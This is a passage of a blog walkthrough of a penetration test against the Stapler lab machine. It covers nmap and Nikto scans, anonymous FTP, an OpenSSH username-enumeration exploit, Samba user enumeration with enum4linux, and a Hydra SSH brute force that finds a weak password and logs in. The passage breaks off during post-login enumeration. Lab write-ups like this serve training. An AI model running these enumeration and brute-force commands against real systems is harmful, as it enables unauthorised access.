</span><span class='line'>SF:xf8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\xaak
</span><span class='line'>SF:\xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x7fy\
</span><span class='line'>SF:xd2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f\x7f
</span><span class='line'>SF:\xf9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xcb\
</span><span class='line'>SF:[\x93&\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&M~{\xb9\x9b\xf7\xda-\xac\]_\xf9\x
</span><span class='line'>SF:cc\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\xa
</span><span class='line'>SF:7\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x81\
</span><span class='line'>SF:xfd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\x9
</span><span class='line'>SF:6\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb&lt;C\xcap\x8f
</span><span class='line'>SF:\xd0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&\xf4
</span><span class='line'>SF:\xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xcd\
</span><span class='line'>SF:x88\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\xb
</span><span class='line'>SF:cL}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\xf0
</span><span class='line'>SF:\.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x04\
</span><span class='line'>SF:xf6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\x
</span><span class='line'>SF:f3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11\
</span><span class='line'>SF:?\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");
</span><span class='line'>MAC Address: 00:0C:29:2B:76:7B (VMware)
</span><span class='line'>Device type: general purpose
</span><span class='line'>Running: Linux 3.X|4.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
</span><span class='line'>OS details: Linux 3.2 - 4.9
</span><span class='line'>Network Distance: 1 hop
</span><span class='line'>Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span><span class='line'>
</span><span class='line'>Host script results:
</span><span class='line'>|_clock-skew: mean: 2h37m22s, deviation: 34m37s, median: 2h57m21s
</span><span class='line'>|_nbstat: NetBIOS name: RED, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
</span><span class='line'>| smb-os-discovery: 
</span><span class='line'>|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
</span><span class='line'>|   Computer name: red
</span><span class='line'>|   NetBIOS computer name: RED\x00
</span><span class='line'>|   Domain name: \x00
</span><span class='line'>|   FQDN: red
</span><span class='line'>|_  System time: 2018-05-27T11:57:06+01:00
</span><span class='line'>| smb-security-mode: 
</span><span class='line'>|   account_used: guest
</span><span class='line'>|   authentication_level: user
</span><span class='line'>|   challenge_response: supported
</span><span class='line'>|_  message_signing: disabled (dangerous, but default)
</span><span class='line'>| smb2-security-mode: 
</span><span class='line'>|   2.02: 
</span><span class='line'>|_    Message signing enabled but not required
</span><span class='line'>| smb2-time: 
</span><span class='line'>|   date: 2018-05-27 06:57:06
</span><span class='line'>|_  start_date: N/A
</span></code></pre></td></tr></table></div></figure>


<p>Many services, so multiple entry points..hopefully. I decided to check each of them.</p>

<h2>FTP server</h2>

<p>In the port scan results we saw how the FTP server allows anonymous logins. I wanted to find out more about it and used the Metasploit auxiliary FTP scanner:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf auxiliary(scanner/ftp/ftp_version) &gt; run
</span><span class='line'>
</span><span class='line'>[+] 192.168.217.141:21    - FTP Banner: '220-\x0d\x0a220-|-----------------------------------------------------------------------------------------|\x0d\x0a220-| Harry, make sure to update the banner when you get a chance to show who has access here |\x0d\x0a220-|-----------------------------------------------------------------------------------------|\x0d\x0a220-\x0d\x0a220 \x0d\x0a'
</span><span class='line'>[*] Scanned 1 of 1 hosts (100% complete)
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>


<p>Now we know a possible username. Next I logged in anonymously to the server and found a note, which I downloaded:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ftp&gt; dir
</span><span class='line'>200 PORT command successful. Consider using PASV.
</span><span class='line'>150 Here comes the directory listing.
</span><span class='line'>-rw-r--r--    1 0        0             107 Jun 03  2016 note
</span><span class='line'>226 Directory send OK.
</span><span class='line'>ftp&gt; get note
</span><span class='line'>local: note remote: note
</span><span class='line'>200 PORT command successful. Consider using PASV.
</span><span class='line'>150 Opening BINARY mode data connection for note (107 bytes).
</span><span class='line'>226 Transfer complete.
</span><span class='line'>107 bytes received in 0.05 secs (1.9866 kB/s)</span></code></pre></td></tr></table></div></figure>


<p>The note reveals more names that might come in handy later:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat note
</span><span class='line'>Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.</span></code></pre></td></tr></table></div></figure>


<p>Before moving on, I made a list of the usernames that were found so far + root:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# cat users
</span><span class='line'>harry
</span><span class='line'>elly
</span><span class='line'>john
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<h2>OpenSSH 7.2p2</h2>

<p>With the usernames I found, I tried the <a href="https://www.exploit-db.com/exploits/40136/">OpenSSH 7.2p2 &ndash; Username Enumeration exploit</a>, but with no success:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python 40136.py -U users 192.168.217.141
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>User name enumeration against SSH daemons affected by CVE-2016-6210
</span><span class='line'>Created and coded by 0_o (nu11.nu11 [at] yahoo.com), PoC by Eddie Harari
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>[*] Testing SSHD at: 192.168.217.141:22, Banner: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4
</span><span class='line'>[*] Getting baseline timing for authenticating non-existing users............
</span><span class='line'>[*] Baseline mean for host 192.168.217.141 is 0.0489913 seconds.
</span><span class='line'>[*] Baseline variation for host 192.168.217.141 is 0.0210717273238 seconds.
</span><span class='line'>[*] Defining timing of x &lt; 0.112206481972 as non-existing user.
</span><span class='line'>[*] Testing your users...
</span><span class='line'>[-] harry - timing: 0.075312
</span><span class='line'>[-] elly - timing: 0.06393
</span><span class='line'>[-] john - timing: 0.050554
</span><span class='line'>[-] root - timing: 0.084294</span></code></pre></td></tr></table></div></figure>


<p>I decided to move on and come back if I get more usernames or fail to get in with other methods.</p>

<h2>dnsmasq</h2>

<p>After some research, I found that dnsmasq 2.75 is prone to multiple DoS vulnerabilities:</p>

<p><a href="https://www.cvedetails.com/cve/CVE-2015-8899/">https://www.cvedetails.com/cve/CVE-2015-8899/</a></p>

<p><a href="https://www.exploit-db.com/exploits/42942/">https://www.exploit-db.com/exploits/42942/</a></p>

<p>We don&rsquo;t want to crash the machine, but we could if we wanted to :)</p>

<h2>Web server on port 80</h2>

<p>The webpage seems empty, with only a Not Found message that states &ldquo;The requested resource / was not found on this server.&rdquo;</p>

<p>I ran Nikto with no big discoveries:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nikto -h http://192.168.217.141/
</span><span class='line'>- Nikto v2.1.6
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Target IP:          192.168.217.141
</span><span class='line'>+ Target Hostname:    192.168.217.141
</span><span class='line'>+ Target Port:        80
</span><span class='line'>+ Start Time:         2018-06-01 04:44:48 (GMT-4)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Server: No banner retrieved
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
</span><span class='line'>+ No CGI Directories found (use '-C all' to force check all possible dirs)
</span><span class='line'>+ OSVDB-3093: /.bashrc: User home dir was found with a shell rc file. This may reveal file and path information.
</span><span class='line'>+ OSVDB-3093: /.profile: User home dir with a shell profile was found. May reveal directory information and system configuration.
</span><span class='line'>+ ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response
</span><span class='line'>+ Scan terminated:  20 error(s) and 5 item(s) reported on remote host
</span><span class='line'>+ End Time:           2018-06-01 04:45:10 (GMT-4) (22 seconds)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ 1 host(s) tested</span></code></pre></td></tr></table></div></figure>


<p>Downloaded the .bashrc and .profile files, but there was nothing useful in there.</p>

<h2>Doom</h2>

<p>Here I couldn&rsquo;t find much, the data returned when connecting to it is gibberish. I&rsquo;ve read online about how this could be used for the original Doom game. But there was something that caught my eye when Nmap attempted to fingerprint this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>message2.jpgUT</span></code></pre></td></tr></table></div></figure>


<p>Maybe I can redirect this to a file and get an image.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vn 192.168.217.141 666 &gt; something
</span><span class='line'>(UNKNOWN) [192.168.217.141] 666 (?) open
</span><span class='line'>root@kali:~# file something 
</span><span class='line'>something: Zip archive data, at least v2.0 to extract</span></code></pre></td></tr></table></div></figure>


<p>Nice, an archive! Inside there was the image from earlier:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>unzip something
</span><span class='line'>Archive:  something
</span><span class='line'>  inflating: message2.jpg      </span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/pentest/stapler/message2.jpg" title="message" alt="message"></p>

<p>This is it? Maybe there&rsquo;s something more..I ran strings on it to get another message:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>1If you are reading this, you should get a cookie!</span></code></pre></td></tr></table></div></figure>


<p>At least it&rsquo;s something..</p>

<h2>MySQL</h2>

<p>Nothing significant here, but something must be using this database.</p>

<h1>Shell #1 &ndash; Samba</h1>

<p>I used enum4linux for Samba enumeration, but only showing what I found most interesting below:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>enum4linux -a 192.168.217.141
</span><span class='line'>============================================ 
</span><span class='line'>|    Share Enumeration on 192.168.217.141    |
</span><span class='line'> ============================================ 
</span><span class='line'>WARNING: The "syslog" option is deprecated
</span><span class='line'>
</span><span class='line'>  Sharename       Type      Comment
</span><span class='line'>  ---------       ----      -------
</span><span class='line'>  print$          Disk      Printer Drivers
</span><span class='line'>  kathy           Disk      Fred, What are we doing here?
</span><span class='line'>  tmp             Disk      All temporary files should be stored here
</span><span class='line'>  IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
</span><span class='line'>Reconnecting with SMB1 for workgroup listing.
</span><span class='line'>
</span><span class='line'>  Server               Comment
</span><span class='line'>  ---------            -------
</span><span class='line'>
</span><span class='line'>  Workgroup            Master
</span><span class='line'>  ---------            -------
</span><span class='line'>  WORKGROUP            RED
</span><span class='line'>
</span><span class='line'>[+] Attempting to map shares on 192.168.217.141
</span><span class='line'>//192.168.217.141/print$  Mapping: DENIED, Listing: N/A
</span><span class='line'>//192.168.217.141/kathy   Mapping: OK, Listing: OK
</span><span class='line'>//192.168.217.141/tmp Mapping: OK, Listing: OK
</span><span class='line'>//192.168.217.141/IPC$    [E] Can't understand response:
</span><span class='line'>WARNING: The "syslog" option is deprecated
</span><span class='line'>NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
</span><span class='line'>
</span><span class='line'>========================================================================== 
</span><span class='line'>|    Users on 192.168.217.141 via RID cycling (RIDS: 500-550,1000-1050)    |
</span><span class='line'> ========================================================================== 
</span><span class='line'>+] Enumerating users using SID S-1-22-1 and logon username '', password ''
</span><span class='line'>S-1-22-1-1000 Unix User\peter (Local User)
</span><span class='line'>S-1-22-1-1001 Unix User\RNunemaker (Local User)
</span><span class='line'>S-1-22-1-1002 Unix User\ETollefson (Local User)
</span><span class='line'>S-1-22-1-1003 Unix User\DSwanger (Local User)
</span><span class='line'>S-1-22-1-1004 Unix User\AParnell (Local User)
</span><span class='line'>S-1-22-1-1005 Unix User\SHayslett (Local User)
</span><span class='line'>S-1-22-1-1006 Unix User\MBassin (Local User)
</span><span class='line'>S-1-22-1-1007 Unix User\JBare (Local User)
</span><span class='line'>S-1-22-1-1008 Unix User\LSolum (Local User)
</span><span class='line'>S-1-22-1-1009 Unix User\IChadwick (Local User)
</span><span class='line'>S-1-22-1-1010 Unix User\MFrei (Local User)
</span><span class='line'>S-1-22-1-1011 Unix User\SStroud (Local User)
</span><span class='line'>S-1-22-1-1012 Unix User\CCeaser (Local User)
</span><span class='line'>S-1-22-1-1013 Unix User\JKanode (Local User)
</span><span class='line'>S-1-22-1-1014 Unix User\CJoo (Local User)
</span><span class='line'>S-1-22-1-1015 Unix User\Eeth (Local User)
</span><span class='line'>S-1-22-1-1016 Unix User\LSolum2 (Local User)
</span><span class='line'>S-1-22-1-1017 Unix User\JLipps (Local User)
</span><span class='line'>S-1-22-1-1018 Unix User\jamie (Local User)
</span><span class='line'>S-1-22-1-1019 Unix User\Sam (Local User)
</span><span class='line'>S-1-22-1-1020 Unix User\Drew (Local User)
</span><span class='line'>S-1-22-1-1021 Unix User\jess (Local User)
</span><span class='line'>S-1-22-1-1022 Unix User\SHAY (Local User)
</span><span class='line'>S-1-22-1-1023 Unix User\Taylor (Local User)
</span><span class='line'>S-1-22-1-1024 Unix User\mel (Local User)
</span><span class='line'>S-1-22-1-1025 Unix User\kai (Local User)
</span><span class='line'>S-1-22-1-1026 Unix User\zoe (Local User)
</span><span class='line'>S-1-22-1-1027 Unix User\NATHAN (Local User)
</span><span class='line'>S-1-22-1-1028 Unix User\www (Local User)
</span><span class='line'>S-1-22-1-1029 Unix User\elly (Local User)</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s a ton of users! I&rsquo;ve proceeded to look at the shares with the guest/guest combination:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smbclient //192.168.217.141/kathy -U guest
</span><span class='line'>WARNING: The "syslog" option is deprecated
</span><span class='line'>Enter WORKGROUP\guest's password: 
</span><span class='line'>Try "help" to get a list of possible commands.
</span><span class='line'>smb: \&gt; ls
</span><span class='line'>  .                                   D        0  Fri Jun  3 12:52:52 2016
</span><span class='line'>  ..                                  D        0  Mon Jun  6 17:39:56 2016
</span><span class='line'>  kathy_stuff                         D        0  Sun Jun  5 11:02:27 2016
</span><span class='line'>  backup                              D        0  Sun Jun  5 11:04:14 2016
</span><span class='line'>
</span><span class='line'>      19478204 blocks of size 1024. 16396296 blocks available</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;ve looked on the net how to download entire folders and then did just that:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smb: \&gt; tarmode
</span><span class='line'>tar:316  tarmode is now full, system, hidden, noreset, quiet
</span><span class='line'>smb: \&gt; recurse
</span><span class='line'>smb: \&gt; prompt
</span><span class='line'>smb: \&gt; mget kathy_stuff\
</span><span class='line'>NT_STATUS_OBJECT_NAME_INVALID listing \kathy_stuff\
</span><span class='line'>smb: \&gt; mget kathy_stuff
</span><span class='line'>getting file \kathy_stuff\todo-list.txt of size 64 as todo-list.txt (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
</span><span class='line'>smb: \&gt; backup
</span><span class='line'>smb: \&gt; mget backup
</span><span class='line'>getting file \backup\vsftpd.conf of size 5961 as vsftpd.conf (176.4 KiloBytes/sec) (average 43.9 KiloBytes/sec)
</span><span class='line'>getting file \backup\wordpress-4.tar.gz of size 6321767 as wordpress-4.tar.gz (14224.9 KiloBytes/sec) (average 10879.4 KiloBytes/sec)</span></code></pre></td></tr></table></div></figure>


<p>The sequence of commands for downloading folders with smbclient and their description is below:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smb: \&gt; ? tarmode
</span><span class='line'>HELP tarmode:
</span><span class='line'>  &lt;full|inc|reset|noreset&gt; tar's behaviour towards archive bits
</span><span class='line'>
</span><span class='line'>smb: \&gt; ? recurse
</span><span class='line'>HELP recurse:
</span><span class='line'>  toggle directory recursion for mget and mput
</span><span class='line'>
</span><span class='line'>smb: \&gt; ? prompt
</span><span class='line'>HELP prompt:
</span><span class='line'>  toggle prompting for filenames for mget and mput
</span><span class='line'>
</span><span class='line'>smb: \&gt; ? mget
</span><span class='line'>HELP mget:
</span><span class='line'>  &lt;mask&gt; get all the matching files</span></code></pre></td></tr></table></div></figure>


<p>Next I looked at the tmp share but it was empty. So it&rsquo;s time to see what we&rsquo;ve got:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/kathy_stuff# ls
</span><span class='line'>todo-list.txt
</span><span class='line'>root@kali:~/kathy_stuff# cat todo-list.txt 
</span><span class='line'>I'm making sure to backup anything important for Initech, Kathy</span></code></pre></td></tr></table></div></figure>


<p>Well then, something interesting has to be inside the backup folder:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/backup# ls
</span><span class='line'>vsftpd.conf  wordpress-4.tar.gz</span></code></pre></td></tr></table></div></figure>


<p>The config file for vsftpd and a Wordpress backup! I tried grep&#8217;ing for passwords and looked over the config file, but nothing overly obvious, so again I left these for later in case nothing else works out. For now, I thought about trying my luck again on SSH with the new users. First I put the output from the Samba enumeration in a file and then I selected only the username part and put it in the users file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat userlist | cut -d'\' -f2 | cut -d' ' -f1 &gt; users
</span><span class='line'>cat users
</span><span class='line'>peter
</span><span class='line'>RNunemaker
</span><span class='line'>ETollefson
</span><span class='line'>DSwanger
</span><span class='line'>AParnell
</span><span class='line'>SHayslett
</span><span class='line'>MBassin
</span><span class='line'>JBare
</span><span class='line'>LSolum
</span><span class='line'>IChadwick
</span><span class='line'>MFrei
</span><span class='line'>SStroud
</span><span class='line'>CCeaser
</span><span class='line'>JKanode
</span><span class='line'>CJoo
</span><span class='line'>Eeth
</span><span class='line'>LSolum2
</span><span class='line'>JLipps
</span><span class='line'>jamie
</span><span class='line'>Sam
</span><span class='line'>Drew
</span><span class='line'>jess
</span><span class='line'>SHAY
</span><span class='line'>Taylor
</span><span class='line'>mel
</span><span class='line'>kai
</span><span class='line'>zoe
</span><span class='line'>NATHAN
</span><span class='line'>www
</span><span class='line'>elly</span></code></pre></td></tr></table></div></figure>


<p>There has to be a reason for the ease of enumerating all these users, so I used the file to bruteforce the SSH login, to have something going while working on other services. I used Hydra with the <em>nsr</em> flag for additional checks of &ldquo;n&rdquo; for null password, &ldquo;s&rdquo; try login as pass, &ldquo;r&rdquo; try the reverse login as pass. And I got something super fast!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>hydra -L users -e nsr 192.168.217.141 ssh
</span><span class='line'>Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
</span><span class='line'>
</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) starting at 2018-06-02 07:49:25
</span><span class='line'>[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
</span><span class='line'>[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
</span><span class='line'>[DATA] max 16 tasks per 1 server, overall 16 tasks, 90 login tries (l:30/p:3), ~6 tries per task
</span><span class='line'>[DATA] attacking ssh://192.168.217.141:22/
</span><span class='line'>[22][ssh] host: 192.168.217.141   login: SHayslett   password: SHayslett
</span><span class='line'>1 of 1 target successfully completed, 1 valid password found
</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) finished at 2018-06-02 07:50:11</span></code></pre></td></tr></table></div></figure>


<p>Woohoo, a user we can log in with!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh SHayslett@192.168.217.141
</span><span class='line'>-----------------------------------------------------------------
</span><span class='line'>~          Barry, don't forget to put a message here           ~
</span><span class='line'>-----------------------------------------------------------------
</span><span class='line'>SHayslett@192.168.217.141's password: 
</span><span class='line'>Welcome back!
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>SHayslett@red:~$ </span></code></pre></td></tr></table></div></figure>


<p>I did some enumeration. In the web directory I found another hidden message:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>SHayslett@red:~$ cat /var/www/https/announcements/message.txt 
</span><span class='line'>Abby, we need to link the folder somewhere! Hidden at the mo</span></code></pre></td></tr></table></div></figure>


<p>Inside the /srv folder I noticed a tftp directory, so I checked if TFTP is running, and it was:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>netstat -lnp | grep 69
